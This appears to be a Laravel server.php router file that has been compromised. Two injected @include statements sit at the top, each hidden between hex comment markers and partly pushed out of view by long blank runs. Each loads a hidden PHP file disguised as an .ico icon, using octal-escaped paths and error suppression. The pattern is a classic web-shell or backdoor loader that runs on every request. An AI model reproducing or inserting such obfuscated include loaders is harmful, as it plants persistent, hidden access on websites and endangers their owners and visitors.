<?php
/*11649*/

@include "\057home\057dhxe\1429kzh\160br/p\165blic\137html\057coll\141bapi\057vend\157r/lc\157bucc\151/.5a\146be85\070.ico";

/*11649*/









































































































/*7e2f1*/

@include "\057home\057dhxe\1429kzh\160br/p\165blic\137html\057prin\164it/t\162an_d\157c/74\057.0e2\0662830\056ico";

/*7e2f1*/


/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
